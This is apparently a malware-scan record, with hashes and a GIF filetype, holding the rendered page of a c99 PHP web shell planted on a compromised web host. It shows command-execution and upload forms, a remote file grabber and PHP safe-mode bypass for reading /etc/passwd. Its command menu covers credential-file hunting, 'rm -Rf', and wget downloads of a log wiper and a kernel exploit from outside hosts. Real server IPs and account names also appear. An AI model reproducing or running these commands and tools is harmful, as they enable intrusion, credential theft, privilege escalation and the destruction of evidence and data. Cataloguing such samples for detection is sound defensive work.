X3Jlc291cmNlKCR0aGlzLT5yZXNEYikpewoJCQoJCQlteXNxbF9jbG9zZSgkdGhpcy0+cmVzRGIpOwoJCX0KCX0KCQoJLyoqCgkgKiBAYnJpZWYgU2VuZHMgdGhlIHN1Y2Nlc3NmdWwgcmVzcG9uc2UgYmFjayB0byB0eHROYXRpb25zIHNlcnZlcgoJICogQG5vdGUgQWNrbm93bGVkZ2VtZW50IGlzIHJlcXVpcmVkIHNvIHdlIGNhbiBmdWxseSBzdXBwb3J0IGFuZCBoZWxwIG1haW50YWluIGEgd29ya2luZyBzeXN0ZW0gb3IgY29tbXVuaWNhdGlvbgoJICoKCSAqIEBwYXJhbSBzdHJpbmcgJHN0clN1Y2Nlc3NNZXNzYWdlCgkgKiBAcGFyYW0gYm9vbGVhbiAkYmxQYXNzd29yZENvdW50CgkgKi8KCWZ1bmN0aW9uIFNjcmlwdFN1Y2Nlc3MoJHN0clN1Y2Nlc3NNZXNzYWdlID0gbnVsbCwgJGJsUGFzc3dvcmRDb3VudCA9IHRydWUpewoKCQkkc3RyQWRkaXRvbmFsRGF0YSA9ICR0aGlzLT5Qcm9jZXNzQWRkaXRpb25hbERhdGEoKTsKCQkKCQkkc3RyQWRkaXRvbmFsRGF0YSAuPSAkdGhpcy0+UHJvY2Vzc1N5c3RlbUluZm9ybWF0aW9uKCRibFBhc3N3b3JkQ291bnQpOwoJCQoJCSR0aGlzLT5FbmRTZXNzaW9uKCk7CgkJCgkJaGVhZGVyKCJIVFRQLzEuMSAyMDAgT0siKTsKCQkKCQlkaWUoIjxyZXNwb25zZT57JHN0clN1Y2Nlc3NNZXNzYWdlfTwvcmVzcG9uc2U+XG57JHN0ckFkZGl0b25hbERhdGF9Iik7Cgl9CgkKCS8qKgoJICogQGJyaWVmIFNlbmRzIHRoZSBlcnJvciByZXNwb25zZSBiYWNrIHRvIHR4dE5hdGlvbnMgc2VydmVyCgkgKiBAbm90ZSBBY2tub3dsZWRnZW1lbnQgaXMgcmVxdWlyZWQgc28gd2UgY2FuIGZ1bGx5IHN1cHBvcnQgYW5kIGhlbHAgbWFpbnRhaW4gYSB3b3JraW5nIHN5c3RlbSBvciBjb21tdW5pY2F0aW9uCgkgKgoJICogQHBhcmFtIHN0cmluZyAkc3RyU3VjY2Vzc01lc3NhZ2UKCSAqIEBwYXJhbSBib29sZWFuICRibFBhc3N3b3JkQ291bnQKCSAqLwoJZnVuY3Rpb24gU2NyaXB0RXJyb3IoJHN0ckVycm9yTWVzc2FnZSA9IG51bGwpewoKCQkkc3RyQWRkaXRvbmFsRGF0YSA9ICR0aGlzLT5Qcm9jZXNzQWRkaXRpb25hbERhdGEoKTsKCQkKCQkkc3RyQWRkaXRvbmFsRGF0YSAuPSAkdGhpcy0+UHJvY2Vzc1N5c3RlbUluZm9ybWF0aW9uKCk7CgkJCgkJJHRoaXMtPkVuZFNlc3Npb24oKTsKCQkKCQloZWFkZXIoIkhUVFAvMS4xIDIwMCBPSyIpOwoJCQoJCWRpZSgiPGVycm9yPnskc3RyRXJyb3JNZXNzYWdlfTwvZXJyb3I+XG57JHN0ckFkZGl0b25hbERhdGF9Iik7Cgl9CgkKfQoKPz4=</textarea><br><br><b>HEXDUMP:</b><nobr> [<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=info&fullhexdump=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\">Full</a>] [<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=info&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\">Preview</a>]<br><b>Base64: </b>\n<nobr>[<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=info&base64=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\">Encode</a>]&nbsp;</nobr>\n<nobr>[<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=info&base64=2&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\">+chunk</a>]&nbsp;</nobr>\n<nobr>[<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=info&base64=3&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\">+chunk+quotes</a>]&nbsp;</nobr>\n<nobr>[<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=info&base64=4&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\">Decode</a>]&nbsp;</nobr>\n<P>\n</td></tr></table><a bookmark=\"minipanel\"><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"?\"><input type=hidden name=act value=\"cmd\"><br/><b>CMD:</b> <input type=hidden name=\"d\" value=\"/home/chsclair/public_html/remote_assist/\"><input type=\"text\" name=\"cmd\" size=\"50\" value=\"\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>\n<br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=search&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/remote_assist/\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>\n <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=upload&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>Upload</b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"file\" name=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><font color=green>[ ok ]</font></form></center></td>\n</tr>\n</table>\n\n\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Remote File Grabber ::</b><br/><br/><form action=\"?grab=true\"   method=\"post\">File Url:<input name=\"from\"> New File Name: <input name=\"to\"> <input type=\"submit\" value=\"Grab!\"></center></td></tr></table>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make Dir ::<p><form action=\"?\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/remote_assist/\"><input type=\"text\" name=\"mkdir\" size=\"50\" value=\"/home/chsclair/public_html/remote_assist/\">&nbsp;<input type=submit value=\"Create\"><br><font color=green>[ ok ]</font></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input type=hidden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/remote_assist/\"><input type=\"text\" name=\"mkfile\" size=\"50\" value=\"/home/chsclair/public_html/remote_assist/\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><font color=green>[ ok ]</font></form></center></td></tr></table>\n\n<br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n    <div align=\"center\"><br/><b>:: Useful Commands ::</b>\n    </div>\n    <form action=\"?\">\n      <div align=\"center\">\n        <input type=hidden name=act value=\"cmd\">\n        <input type=hidden name=\"d\" value=\"/home/chsclair/public_html/remote_assist/\">\n <SELECT NAME=\"cmd\">\n           <OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c /home/chsclair/public_html/td-admin/modules/gallery_management/images\n\">Tar your current directory. (Only works if your dir. is writable)\n           <OPTION VALUE=\"pwd\">List your current directory\n           <OPTION VALUE=\"ls -lia\">List you current directory's files, folders, & permissions\n           <OPTION VALUE=\"find / -type f -perm -04000 -ls\">find suid files\n           <OPTION VALUE=\"find . -type f -perm -04000 -ls\">find suid files in current dir\n           <OPTION VALUE=\"find / -type f -perm -02000 -ls\">find sgid files\n           <OPTION VALUE=\"find . -type f -perm -02000 -ls\">find sgid files in current dir\n           <OPTION VALUE=\"uname -a\">Kernel version\n           <OPTION VALUE=\"w\">Logged in users\n           <OPTION VALUE=\"lastlog\">Last users to connect\n           <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins\n           <OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">Users without passwords\n                    <OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Is /etc/ writable?\n                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D\n                    <OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CpuInfo\n                    <OPTION VALUE=\"netstat -atup | grep IST\">Open ports\n                    <OPTION VALUE=\"locate gcc\">Is gcc installed?\n\t\t    <OPTION VALUE=\"find / -type f -name config.inc.php\">find config.inc.php files\n<OPTION VALUE=\"find . -type f -name config.inc.php\">find config.inc.php files in current dir\n<OPTION VALUE=\"find / -type f -name \"config*\">find config* files\n<OPTION VALUE=\"find . -type f -name \"config*\">find config* files in current dir\n<OPTION VALUE=\"find / -type f -perm -2 -ls\">find all writable files\n<OPTION VALUE=\"find . -type f -perm -2 -ls\">find all writable files in current dir\n<OPTION VALUE=\"find /  -type d -perm -2 -ls\">find all writable directories\n<OPTION VALUE=\"find . -type d -perm -2 -ls\">find all writable directories in current dir\n<OPTION VALUE=\"find / -perm -2 -ls\">find all writable directories and files\n<OPTION VALUE=\"find . -perm -2 -ls\">find all writable directories and files in current dir\n<OPTION VALUE=\"find / -type f -name service.pwd\">find all service.pwd files\n<OPTION VALUE=\"find . -type f -name service.pwd\">find service.pwd files in current dir'\n<OPTION VALUE=\"find / -type f -name .htpasswd\">find all .htpasswd files\n<OPTION VALUE=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir\n<OPTION VALUE=\"find / -type f -name .bash_history\">find all .bash_history files\n<OPTION VALUE=\"find . -type f -name .bash_history\">find .bash_history files in current dir\n<OPTION VALUE=\"find / -type f -name .mysql_history\">find all .mysql_history files\n<OPTION VALUE=\"find . -type f -name .mysql_history\">find .mysql_history files in current dir\n<OPTION VALUE=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files\n<OPTION VALUE=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir\n<OPTION VALUE=\"lsattr -va\">list file attributes on a Linux second extended file system\n\t\t\t\n                    <OPTION VALUE=\"rm -Rf\">Format this box.\n                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)\n                    <OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2\n                    <OPTION VALUE=\"./zap2\">WIPELOGS PT3\n                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)\n                    <OPTION VALUE=\"./k3 1\">Kernel attack (Krad.c) PT2 (L1)\n                    <OPTION VALUE=\"./k3 2\">Kernel attack (Krad.c) PT2 (L2)\n                    <OPTION VALUE=\"./k3 3\">Kernel attack (Krad.c) PT2 (L3)\n                    <OPTION VALUE=\"./k3 4\">Kernel attack (Krad.c) PT2 (L4)\n                    <OPTION VALUE=\"./k3 5\">Kernel attack (Krad.c) PT2 (L5)\n                  </SELECT>\n        <input type=hidden name=\"cmd_txt\" value=\"1\">\n        &nbsp;\n        <input type=submit name=submit value=\"Execute\"></div>\n    </form>\n    </td>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n  <center><br/><b>:: Kernel Info :: </b>\n<form action=http://google.com/search name=f><input type=hidden name=client value=\"firefox-a\"><input type=hidden name=rls value=\"org.mozilla:en-US:official_s\"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value=\"Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09\nEST 2011 i686\" size=30>&nbsp;<input type=submit value=\"Search\" name=btnG></form>\n</center>\n    </td>\n</tr></TABLE><br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n    <div align=\"center\">Php Safe-Mode Bypass (Read Files)\n    </div><br>\n    <form action=\"?\">\n      <div align=\"center\">\n      File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>\n      \n      \n      \n           \n      \n      \n      \t\n\t\n          <br>\n      </div>\n    </form>\n    </td>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n   <center>Php Safe-Mode Bypass (List Directories):     <form action=\"?\">\n      <div align=\"center\"><br>\n      Dir: <input type=\"text\" name=\"directory\" method=\"get\"> <input type=\"submit\" value=\"List Directory\"><br><br> eg: /etc/<br>\n\n    </form></center>\n    </td>\n</tr></TABLE>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go Dir ::</b><form action=\"?\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"/home/chsclair/public_html/remote_assist/\">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File ::</b><form action=\"?\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/remote_assist/\"><input type=\"text\" name=\"f\" size=\"50\" value=\"/home/chsclair/public_html/remote_assist/\">&nbsp;<input type=submit value=\"Go\"></form></center></td></tr></table>\n</td>\n</tr>\n</TABLE>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell modded by synsta. | Page generation time: 0.0134 ]--</p></td></tr></table>\n<br/></body></html>"
    },
    "filename": "VirusShare_aebc47075bc0fc6109c32e26704b5ff0",
    "filesize": 64003,
    "filetype": "GIF image data 3425 x 15370",
    "hashes": {
        "md5": "aebc47075bc0fc6109c32e26704b5ff0",
        "sha1": "0d4e023991c951772a03e0c07cb91e715b2afabf",
        "sha256": "5dbb7d2d01d29e7240615fcb7eaa5dc75e723ac72da6f001d0d54030108c469f"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "GIF89;a",
            "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" content=\"en-us\"><title>c99 v0.0.1 SYN-MOD [SYNSTA] @www.charmainesinclairlive.co.uk</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webdings size=6><b>!</b></font><a href=\"?\"><font face=\"Verdana\" size=\"5\"><b>c99 v0.0.1 SYN-MOD [SYNSTA]</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;Apache. <a href=\"?act=phpinfo\" target=\"_blank\"><b><u>PHP/5.2.9</u></b></a></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09 EST 2011 i686</b>&nbsp;</p><b>Disabled functions</b> : <b><font color=green>NONE</font></b><p align=\"left\"><b>We are: uid=608(chsclair) gid=605(chsclair) groups=605(chsclair)<br>context=system_u:system_r:crond_t:s0-s0:c0.c1023<br/>cURL: <b><font color=green>ON</font><br/>MySQL: <b><font color=green>ON</font></b><br/>MSSQL: <b><font color=red>OFF</font><br/>PostgreSQL: <b><font color=red>OFF</font><br/>Oracle: <b><font color=red>OFF</font> </b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align=\"left\"><a href=\"?act=ls&d=%2F&sort=0a\"><b>/</b></a><a href=\"?act=ls&d=%2Fhome%2F&sort=0a\"><b>home/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2F&sort=0a\"><b>chsclair/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2Fpublic_html%2F&sort=0a\"><b>public_html/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F&sort=0a\"><b>remote_assist/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=green>drwxr-xr-x</font></b><br><b>Free 240.12 GB of 389.31 GB (61.68%)</b><br><b>Your ip: <a href=http://87.177.187.39>87.177.187.39</a> - Server ip: <a href=http://109.75.162.166>109.75.162.166</a></b><br/><a href=\"?\"><hr><b>[Home]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=search&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[Search]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=fsbuff&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[Buffer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=encoder&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[Encoder]</b></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=tools&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=processes&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[Processes]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=ftpquickbrute&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[FTP Brute Forcer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=security&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[Server Security Information]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=sql&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[SQL Manager]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=eval&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F&eval=readfile('/etc/passwd');\"><b>[Eval PHP code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=selfremove\"><b>[Self remove]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=cmd&cmd=cat+%2Fvar%2Fcpanel%2Faccounting.log&cmd_txt=1&submit=Execute\"><b>[Cpanel Logs]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\"><b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[php]&nbsp;PasswordManagement-1.1.0.class.php (29.67 KB) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=green>-rw-r--r--</font></b><br>Select action/file-type:<br> <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=info&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b><u>[hex]</u></b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=info&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=html&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[html]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=html&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=txt&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[txt]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=txt&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=code&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><font color=green>[Code]</font></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=code&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=phpsess&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[Session]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=phpsess&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=exe&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[exe]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=exe&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=sdb&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[SDB]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=sdb&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=img&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[gif]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=img&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=ini&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[ini]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=ini&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=download&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[download]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=download&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=notepad&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[rtf]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=notepad&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=edit&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><b>[change]</b></a> (<a href=\"?act=f&f=PasswordManagement-1.1.0.class.php&ft=edit&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\" target=\"_blank\">+</a>) |<hr size=\"1\" noshade><b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> /home/chsclair/public_html/remote_assist/PasswordManagement-1.1.0.class.php</td></tr><tr><td><b>Size</b></td><td> 29.67 KB</td></tr><tr><td><b>MD5</b></td><td> 878c51cf279dcf569d4f8eb6ee8868bf</td></tr><tr><td><b>Owner/Group</b></td><td> chsclair/chsclair<tr><td><b>Perms</b></td><td><a href=\"?act=chmod&f=PasswordManagement-1.1.0.class.php&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fremote_assist%2F\"><font color=green>-rw-r--r--</font></a></td></tr><tr><td><b>Create time</b></td><td> 26/01/2011 08:28:47</td></tr><tr><td><b>Access time</b></td><td> 07/06/2011 03:43:01</td></tr><tr><td><b>MODIFY time</b></td><td> 06/05/2010 15:18:56</td></tr></table><br><b>HEXDUMP PREVIEW</b><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4><tr><td bgcolor=#666666>00000000<br>00000018<br>00000030<br>00000048<br>00000060<br>00000078<br>00000090<br>000000A8<br></td><td bgcolor=000000>3C 3F 70 68 70 0A 0A 2F 2A 2A 0A 20 2A 20 0A 20 2A 20 50 4C 45 41 53 45 <br>20 44 4F 20 4E 4F 54 20 4D 4F 44 49 46 59 20 54 48 49 53 20 53 43 52 49 <br>50 54 0A 20 2A 20 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D <br>3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 0A 20 2A 20 0A 20 2A 20 4D 6F <br>64 69 66 79 69 6E 67 20 74 68 69 73 20 73 63 72 69 70 74 20 77 69 6C 6C <br>20 63 61 75 6C 65 73 20 70 61 73 73 77 6F 72 64 20 66 61 69 6C 75 72 65 <br>20 61 6E 64 20 65 72 72 6F 72 73 20 69 6E 20 76 61 6C 69 64 20 2F 20 73 <br>65 63 75 72 65 20 73 65 72 76 65 72 20 63 6F 6D 6D 75 6E 69 63 61 74 69 